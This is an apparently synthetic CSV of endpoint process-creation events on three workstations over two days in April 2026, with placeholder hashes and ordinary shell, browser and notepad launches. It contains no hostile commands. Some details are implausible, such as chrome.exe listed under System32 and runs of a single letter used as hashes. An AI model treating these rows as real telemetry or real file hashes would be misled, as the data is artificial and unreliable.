TimeGenerated,Timestamp,DeviceName,DeviceId,AccountName,AccountDomain,FileName,FolderPath,ProcessCommandLine,ProcessId,SHA256,SHA1,MD5,FileSize,InitiatingProcessFileName,InitiatingProcessFolderPath,InitiatingProcessCommandLine,InitiatingProcessId,InitiatingProcessAccountName,InitiatingProcessSHA256,InitiatingProcessSignatureStatus,InitiatingProcessSignerType,ProcessIntegrityLevel,ProcessTokenElevation,Type
2026-04-29T10:23:52Z,2026-04-29T10:23:52Z,WS-DEV-02,dev-ws-dev-02,jadams,CORP,cmd.exe,C:\Windows\System32,cmd.exe,9188,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,1935429,explorer.exe,C:\Windows,C:\Windows\explorer.exe,6696,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T23:02:15Z,2026-04-28T23:02:15Z,WS-HR-03,dev-ws-hr-03,mholmes,CORP,powershell.exe,C:\Windows\System32,powershell.exe,8240,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,4752835,explorer.exe,C:\Windows,C:\Windows\explorer.exe,4326,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T08:18:34Z,2026-04-29T08:18:34Z,WS-DEV-02,dev-ws-dev-02,dchen,CORP,cmd.exe,C:\Windows\System32,cmd.exe,6971,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,4648510,explorer.exe,C:\Windows,C:\Windows\explorer.exe,4210,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T05:10:30Z,2026-04-29T05:10:30Z,WS-HR-03,dev-ws-hr-03,bryce,CORP,powershell.exe,C:\Windows\System32,powershell.exe,3109,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,4519600,explorer.exe,C:\Windows,C:\Windows\explorer.exe,5506,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T18:33:02Z,2026-04-28T18:33:02Z,WS-HR-03,dev-ws-hr-03,mholmes,CORP,chrome.exe,C:\Windows\System32,chrome.exe,6352,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,1412252,explorer.exe,C:\Windows,C:\Windows\explorer.exe,2241,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T18:37:27Z,2026-04-28T18:37:27Z,WS-HR-03,dev-ws-hr-03,jadams,CORP,cmd.exe,C:\Windows\System32,cmd.exe,7804,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,2898157,explorer.exe,C:\Windows,C:\Windows\explorer.exe,2000,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T14:40:25Z,2026-04-28T14:40:25Z,WS-DEV-02,dev-ws-dev-02,mholmes,CORP,chrome.exe,C:\Windows\System32,chrome.exe,3023,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,603433,explorer.exe,C:\Windows,C:\Windows\explorer.exe,5528,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:02:21Z,2026-04-29T11:02:21Z,WS-HR-03,dev-ws-hr-03,dchen,CORP,chrome.exe,C:\Windows\System32,chrome.exe,7702,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,2825657,explorer.exe,C:\Windows,C:\Windows\explorer.exe,9165,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T01:20:01Z,2026-04-29T01:20:01Z,WS-HR-03,dev-ws-hr-03,bryce,CORP,powershell.exe,C:\Windows\System32,powershell.exe,6306,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,1862090,explorer.exe,C:\Windows,C:\Windows\explorer.exe,3324,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T21:31:16Z,2026-04-28T21:31:16Z,WS-DEV-02,dev-ws-dev-02,jadams,CORP,explorer.exe,C:\Windows\System32,explorer.exe,6622,eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,0000000000000000000000004747f7b75a1482c3,0000000000000000594d0396e9eff80c,53872,explorer.exe,C:\Windows,C:\Windows\explorer.exe,4710,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T07:23:57Z,2026-04-29T07:23:57Z,WS-FINANCE-01,dev-ws-finance-01,dchen,CORP,cmd.exe,C:\Windows\System32,cmd.exe,7751,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,160245,explorer.exe,C:\Windows,C:\Windows\explorer.exe,9873,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T01:22:39Z,2026-04-29T01:22:39Z,WS-DEV-02,dev-ws-dev-02,dchen,CORP,powershell.exe,C:\Windows\System32,powershell.exe,4761,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,113357,explorer.exe,C:\Windows,C:\Windows\explorer.exe,3486,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T17:37:16Z,2026-04-28T17:37:16Z,WS-FINANCE-01,dev-ws-finance-01,dchen,CORP,explorer.exe,C:\Windows\System32,explorer.exe,4920,eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,0000000000000000000000004747f7b75a1482c3,0000000000000000594d0396e9eff80c,2867542,explorer.exe,C:\Windows,C:\Windows\explorer.exe,7339,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T19:44:58Z,2026-04-28T19:44:58Z,WS-FINANCE-01,dev-ws-finance-01,dchen,CORP,notepad.exe,C:\Windows\System32,notepad.exe,6685,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,0000000000000000000000000647fda2043cb34d,00000000000000007474b5476f8356fb,4741929,explorer.exe,C:\Windows,C:\Windows\explorer.exe,2641,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T23:01:36Z,2026-04-28T23:01:36Z,WS-DEV-02,dev-ws-dev-02,bryce,CORP,chrome.exe,C:\Windows\System32,chrome.exe,5452,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,4106402,explorer.exe,C:\Windows,C:\Windows\explorer.exe,5520,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T11:24:16Z,2026-04-29T11:24:16Z,WS-FINANCE-01,dev-ws-finance-01,bryce,CORP,chrome.exe,C:\Windows\System32,chrome.exe,2695,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,604109,explorer.exe,C:\Windows,C:\Windows\explorer.exe,5756,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T16:56:31Z,2026-04-28T16:56:31Z,WS-HR-03,dev-ws-hr-03,dchen,CORP,explorer.exe,C:\Windows\System32,explorer.exe,9282,eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,0000000000000000000000004747f7b75a1482c3,0000000000000000594d0396e9eff80c,315053,explorer.exe,C:\Windows,C:\Windows\explorer.exe,8582,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T21:26:11Z,2026-04-28T21:26:11Z,WS-FINANCE-01,dev-ws-finance-01,bryce,CORP,notepad.exe,C:\Windows\System32,notepad.exe,9285,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,0000000000000000000000000647fda2043cb34d,00000000000000007474b5476f8356fb,3299090,explorer.exe,C:\Windows,C:\Windows\explorer.exe,7888,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T14:40:29Z,2026-04-28T14:40:29Z,WS-DEV-02,dev-ws-dev-02,bryce,CORP,explorer.exe,C:\Windows\System32,explorer.exe,6998,eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,0000000000000000000000004747f7b75a1482c3,0000000000000000594d0396e9eff80c,1390850,explorer.exe,C:\Windows,C:\Windows\explorer.exe,9191,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T10:30:26Z,2026-04-29T10:30:26Z,WS-DEV-02,dev-ws-dev-02,bryce,CORP,cmd.exe,C:\Windows\System32,cmd.exe,4310,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,3541467,explorer.exe,C:\Windows,C:\Windows\explorer.exe,4208,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T19:39:22Z,2026-04-28T19:39:22Z,WS-HR-03,dev-ws-hr-03,jadams,CORP,cmd.exe,C:\Windows\System32,cmd.exe,1142,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,1339417,explorer.exe,C:\Windows,C:\Windows\explorer.exe,6527,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T12:24:53Z,2026-04-28T12:24:53Z,WS-DEV-02,dev-ws-dev-02,mholmes,CORP,chrome.exe,C:\Windows\System32,chrome.exe,5576,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,267906,explorer.exe,C:\Windows,C:\Windows\explorer.exe,4353,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T10:03:33Z,2026-04-29T10:03:33Z,WS-FINANCE-01,dev-ws-finance-01,mholmes,CORP,powershell.exe,C:\Windows\System32,powershell.exe,4161,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,1969546,explorer.exe,C:\Windows,C:\Windows\explorer.exe,2259,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T07:40:03Z,2026-04-29T07:40:03Z,WS-FINANCE-01,dev-ws-finance-01,dchen,CORP,chrome.exe,C:\Windows\System32,chrome.exe,4229,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,300248,explorer.exe,C:\Windows,C:\Windows\explorer.exe,5509,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T00:25:01Z,2026-04-29T00:25:01Z,WS-DEV-02,dev-ws-dev-02,dchen,CORP,explorer.exe,C:\Windows\System32,explorer.exe,3703,eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,0000000000000000000000004747f7b75a1482c3,0000000000000000594d0396e9eff80c,2298742,explorer.exe,C:\Windows,C:\Windows\explorer.exe,9755,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T00:24:21Z,2026-04-29T00:24:21Z,WS-HR-03,dev-ws-hr-03,dchen,CORP,notepad.exe,C:\Windows\System32,notepad.exe,4949,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,0000000000000000000000000647fda2043cb34d,00000000000000007474b5476f8356fb,373112,explorer.exe,C:\Windows,C:\Windows\explorer.exe,7730,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T05:47:52Z,2026-04-29T05:47:52Z,WS-DEV-02,dev-ws-dev-02,mholmes,CORP,powershell.exe,C:\Windows\System32,powershell.exe,3281,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,2431951,explorer.exe,C:\Windows,C:\Windows\explorer.exe,7616,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T19:40:08Z,2026-04-28T19:40:08Z,WS-FINANCE-01,dev-ws-finance-01,jadams,CORP,powershell.exe,C:\Windows\System32,powershell.exe,1888,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,4843753,explorer.exe,C:\Windows,C:\Windows\explorer.exe,8380,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T22:32:51Z,2026-04-28T22:32:51Z,WS-DEV-02,dev-ws-dev-02,jadams,CORP,cmd.exe,C:\Windows\System32,cmd.exe,5569,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,2103910,explorer.exe,C:\Windows,C:\Windows\explorer.exe,8771,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T07:52:27Z,2026-04-29T07:52:27Z,WS-FINANCE-01,dev-ws-finance-01,mholmes,CORP,explorer.exe,C:\Windows\System32,explorer.exe,7814,eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,0000000000000000000000004747f7b75a1482c3,0000000000000000594d0396e9eff80c,2494477,explorer.exe,C:\Windows,C:\Windows\explorer.exe,3809,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T00:50:37Z,2026-04-29T00:50:37Z,WS-FINANCE-01,dev-ws-finance-01,mholmes,CORP,notepad.exe,C:\Windows\System32,notepad.exe,6295,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,0000000000000000000000000647fda2043cb34d,00000000000000007474b5476f8356fb,4778538,explorer.exe,C:\Windows,C:\Windows\explorer.exe,4922,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T01:05:16Z,2026-04-29T01:05:16Z,WS-FINANCE-01,dev-ws-finance-01,mholmes,CORP,cmd.exe,C:\Windows\System32,cmd.exe,9048,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,3423221,explorer.exe,C:\Windows,C:\Windows\explorer.exe,8189,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T14:43:20Z,2026-04-28T14:43:20Z,WS-FINANCE-01,dev-ws-finance-01,jadams,CORP,cmd.exe,C:\Windows\System32,cmd.exe,9359,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,4995117,explorer.exe,C:\Windows,C:\Windows\explorer.exe,5457,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T09:32:54Z,2026-04-29T09:32:54Z,WS-DEV-02,dev-ws-dev-02,dchen,CORP,notepad.exe,C:\Windows\System32,notepad.exe,8917,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,0000000000000000000000000647fda2043cb34d,00000000000000007474b5476f8356fb,1693294,explorer.exe,C:\Windows,C:\Windows\explorer.exe,2564,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T11:13:48Z,2026-04-28T11:13:48Z,WS-HR-03,dev-ws-hr-03,dchen,CORP,cmd.exe,C:\Windows\System32,cmd.exe,4849,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,85118,explorer.exe,C:\Windows,C:\Windows\explorer.exe,1734,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T02:50:32Z,2026-04-29T02:50:32Z,WS-HR-03,dev-ws-hr-03,dchen,CORP,cmd.exe,C:\Windows\System32,cmd.exe,7700,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,1060963,explorer.exe,C:\Windows,C:\Windows\explorer.exe,1388,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T14:18:54Z,2026-04-28T14:18:54Z,WS-FINANCE-01,dev-ws-finance-01,jadams,CORP,explorer.exe,C:\Windows\System32,explorer.exe,6127,eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,0000000000000000000000004747f7b75a1482c3,0000000000000000594d0396e9eff80c,3462197,explorer.exe,C:\Windows,C:\Windows\explorer.exe,7248,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T08:25:27Z,2026-04-29T08:25:27Z,WS-FINANCE-01,dev-ws-finance-01,mholmes,CORP,cmd.exe,C:\Windows\System32,cmd.exe,1213,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,4946026,explorer.exe,C:\Windows,C:\Windows\explorer.exe,9848,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
